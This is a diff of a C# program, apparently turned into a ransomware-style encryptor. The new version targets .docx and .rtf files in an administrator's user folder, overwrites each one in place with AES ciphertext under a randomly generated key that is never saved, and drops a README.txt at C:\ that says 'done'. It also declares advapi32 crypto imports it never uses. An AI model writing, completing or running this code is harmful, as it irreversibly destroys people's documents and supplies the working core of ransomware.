@@ -1,70 +1,89 @@
 using System;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace FileEncryption
+public class EncryptionScript
 {
-    public static class FileEncryptor
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CryptGenKey(IntPtr hProv, int Algid, int dwFlags, ref IntPtr phKey);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool final, int dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);
+
+    public static void Main()
     {
-        private static readonly byte[] Key = Encoding.UTF8.GetBytes("YourEncryptionKey");
-        private static readonly byte[] IV = Encoding.UTF8.GetBytes("YourInitializationVector");
+        string directoryPath = @"C:\Users\domain.admin";
+        string readmeFilePath = @"C:\README.txt";
+        string encryptionKey;
 
-        public static void EncryptFiles(string directoryPath)
+        // Generate encryption key
+        using (Aes aes = Aes.Create())
         {
-            string[] fileExtensions = { ".docx", ".rtf" };
-
-            foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
-            {
-                string extension = Path.GetExtension(file);
-
-                if (Array.IndexOf(fileExtensions, extension) >= 0)
-                {
-                    EncryptFile(file);
-                }
-            }
-
-            string readmePath = Path.Combine("C:\\", "README.txt");
-            File.WriteAllText(readmePath, "done");
+            aes.GenerateKey();
+            encryptionKey = Convert.ToBase64String(aes.Key);
         }
 
-        private static void EncryptFile(string filePath)
+        EncryptFiles(directoryPath, encryptionKey);
+        WriteReadmeFile(readmeFilePath);
+    }
+
+    public static void EncryptFiles(string directoryPath, string encryptionKey)
+    {
+        DirectoryInfo directory = new DirectoryInfo(directoryPath);
+
+        foreach (var file in directory.GetFiles("*.docx"))
         {
-            byte[] encryptedData;
+            EncryptFile(file.FullName, encryptionKey);
+        }
 
-            using (Aes aes = Aes.Create())
-            {
-                aes.Key = Key;
-                aes.IV = IV;
-
-                using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open))
-                using (FileStream outputFileStream = new FileStream(filePath + ".encrypted", FileMode.Create))
-                using (CryptoStream cryptoStream = new CryptoStream(outputFileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
-                {
-                    inputFileStream.CopyTo(cryptoStream);
-                }
-            }
-
-            // Optionally, you can delete the original file after encryption.
-            // File.Delete(filePath);
+        foreach (var file in directory.GetFiles("*.rtf"))
+        {
+            EncryptFile(file.FullName, encryptionKey);
         }
     }
 
-    public static class Program
+    public static void EncryptFile(string filePath, string encryptionKey)
     {
-        public static void Main()
+        try
         {
-            string directoryPath = @"C:\Users\domain.admin";
+            byte[] fileBytes = File.ReadAllBytes(filePath);
 
-            try
+            using (Aes aes = Aes.Create())
             {
-                FileEncryptor.EncryptFiles(directoryPath);
-                Console.WriteLine("Encryption complete.");
+                aes.Key = Convert.FromBase64String(encryptionKey);
+
+                // Encrypt the file contents
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(fileBytes, 0, fileBytes.Length);
+                        cryptoStream.FlushFinalBlock();
+
+                        // Update the encrypted contents
+                        byte[] encryptedBytes = memoryStream.ToArray();
+                        File.WriteAllBytes(filePath, encryptedBytes);
+                    }
+                }
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Encryption failed: " + ex.Message);
-            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error encrypting file '{filePath}': {ex.Message}");
+        }
+    }
+
+    public static void WriteReadmeFile(string readmeFilePath)
+    {
+        try
+        {
+            File.WriteAllText(readmeFilePath, "done");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error writing README file: {ex.Message}");
         }
     }
 }
